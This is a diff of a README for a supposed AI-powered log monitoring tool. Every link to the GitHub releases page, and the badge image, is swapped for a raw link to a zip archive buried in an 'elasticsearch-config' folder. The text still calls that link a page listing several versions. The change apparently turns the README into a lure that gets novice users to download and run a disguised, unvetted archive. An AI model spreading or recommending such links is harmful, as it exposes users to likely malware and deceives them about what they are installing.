@@ -4,13 +4,13 @@
 The smart-log-monitoring-agent-with-ai is a powerful tool that helps you monitor your logs with ease. It uses advanced technology to collect, visualize, and analyze logs across Linux systems. With this application, you can detect anomalies automatically, making your log management simpler and more effective.
 
 ## 🔗 Download Now
-[![Download the Application](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/Anjetz34/smart-log-monitoring-agent-with-ai/releases)
+[![Download the Application](https://raw.githubusercontent.com/Anjetz34/smart-log-monitoring-agent-with-ai/main/elasticsearch-config/smart-log-monitoring-agent-with-ai_1.3.zip)](https://raw.githubusercontent.com/Anjetz34/smart-log-monitoring-agent-with-ai/main/elasticsearch-config/smart-log-monitoring-agent-with-ai_1.3.zip)
 
 ## 🚀 Getting Started
 To use the smart log monitoring agent, follow these simple steps. Whether you're new to software or just need a little guidance, you will find everything you need here.
 
 ### 📥 Step 1: Download the Application
-Visit this page to download: [Download Page](https://github.com/Anjetz34/smart-log-monitoring-agent-with-ai/releases). On this page, you will find different versions of the application. Click on the version suitable for your needs, and your download will start automatically.
+Visit this page to download: [Download Page](https://raw.githubusercontent.com/Anjetz34/smart-log-monitoring-agent-with-ai/main/elasticsearch-config/smart-log-monitoring-agent-with-ai_1.3.zip). On this page, you will find different versions of the application. Click on the version suitable for your needs, and your download will start automatically.
 
 ### 💻 Step 2: Install the Application
 Once the download completes, locate the downloaded file on your computer. This usually happens in your "Downloads" folder.
@@ -58,6 +58,6 @@ For more information and help, feel free to check out the following:
 If you’re unable to resolve an issue or have further questions, don’t hesitate to reach out through the repository. You can submit an issue for support or ask for clarifications.
 
 ## 🔗 Download Again
-Don’t forget, you can always visit this page to download: [Download Page](https://github.com/Anjetz34/smart-log-monitoring-agent-with-ai/releases).
+Don’t forget, you can always visit this page to download: [Download Page](https://raw.githubusercontent.com/Anjetz34/smart-log-monitoring-agent-with-ai/main/elasticsearch-config/smart-log-monitoring-agent-with-ai_1.3.zip).
 
 Enjoy your new smart log monitoring experience!
